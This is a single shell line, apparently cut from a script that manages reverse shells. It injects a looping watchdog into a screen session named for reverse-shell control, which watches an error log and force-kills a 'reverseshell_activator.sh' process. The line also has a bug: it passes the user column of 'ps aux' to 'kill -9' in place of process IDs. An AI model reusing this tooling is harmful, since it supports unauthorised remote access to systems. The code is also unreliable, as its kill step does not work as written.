...
screen -S reverseshellControl_$cname -X stuff "while true;do ( tail -f -n0 $installdir/err_$cname.log & ) | grep -q 'read:errno=0'; ps aux | grep reverseshell_activator.sh | awk '{print $1}' | xargs kill -9;done"`echo -ne '\015'`
